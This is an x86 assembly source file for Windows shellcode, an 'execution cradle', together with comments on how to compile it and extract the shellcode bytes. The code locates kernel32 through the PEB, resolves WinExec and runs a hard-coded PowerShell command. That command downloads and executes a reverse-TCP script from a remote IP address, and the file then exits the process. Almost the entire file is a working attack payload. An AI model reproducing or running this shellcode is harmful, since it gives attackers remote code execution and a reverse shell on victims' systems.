; Compile:
; nasm -f win32 x86-exec-cradle.asm -o x86-exec-cradle.o; for i in $(objdump -D x86-exec-cradle.o|grep "^ "|cut -f2);do echo -n '\x'$i; done; echo
; Execution cradle:
; python encode-command.py 'powershell.exe -c iex(iwr http://192.168.43.128/reverse-tcp.ps1)'

_start:
 mov ebp, esp
 sub esp, 0x20

find_kernel32_base:
 xor ebx, ebx
 mov ebx, [fs:ebx+0x30]
 mov ebx, [ebx+0xC]
 mov ebx, [ebx+0x1C]
 mov ebx, [ebx]
 mov ebx, [ebx]
 mov eax, [ebx+0x8]
 mov [ebp-0x4], eax

find_export_table:
 mov ebx, [eax+0x3C]
 add ebx, eax
 mov ebx, [ebx+0x78]
 add ebx, eax

find_name_table:
 mov edi, [ebx+0x20]
 add edi, eax
 mov [ebp-0x8], edi

find_ordinal_table:
 mov ecx, [ebx+0x24]
 add ecx, eax
 mov [ebp-0xC], ecx

find_address_table:
 mov edx, [ebx+0x1C]
 add edx, eax
 mov [ebp-0x10], edx

find_export_count:
 mov edx, [ebx+0x14]
 mov [ebp-0x14], edx

jmp short exec_cradle

find_function:
 xor eax, eax
 mov edx, [ebp-0x14]

find_loop:
 mov edi, [ebp-0x8]
 mov esi, [ebp+0x18]
 xor ecx, ecx
 cld
 mov edi, [edi+eax*4]
 add edi, [ebp-0x4]
 add cx, 0x8
 repe cmpsb
 jz found_function
 inc eax
 cmp eax, edx
 jb find_loop

found_function:
 mov ecx, [ebp-0xC]
 mov edx, [ebp-0x10]
 mov ax,  [ecx + eax*2]
 mov eax, [edx + eax*4]
 add eax, [ebp-0x4]
 ret

exec_cradle:
 mov edx, 0x63657878
 shr edx, 8
 push edx
 push 0x456E6957
 mov [ebp+0x18], esp
 call find_function
 xor ecx, ecx
 push ecx

; TODO: Execution cradle (e.g., powershell.exe -c iex(iwr http://192.168.43.128/reverse-tcp.ps1))
 push 0x29317370         ;)1sp
 push 0x2e706374         ;.pct
 push 0x2d657372         ;-esr
 push 0x65766572         ;ever
 push 0x2f383231         ;/821
 push 0x2e33342e         ;.34.
 push 0x3836312e         ;861.
 push 0x3239312f         ;291/
 push 0x2f3a7074         ;/:pt
 push 0x74682072         ;th r
 push 0x77692878         ;wi(x
 push 0x65692063         ;ei c
 push 0x2d206578         ;- ex
 push 0x652e6c6c         ;e.ll
 push 0x65687372         ;ehsr
 push 0x65776f70         ;ewop

 mov ebx, esp
 inc ecx
 push ecx
 push ebx
 call eax

exit_process:
 xor ecx, ecx
 mov ecx, 0x73736501
 shr ecx, 8
 push ecx
 push 0x636F7250
 push 0x74697845
 mov [ebp+0x18], esp
 call find_function
 xor edx, edx
 push edx
 call eax
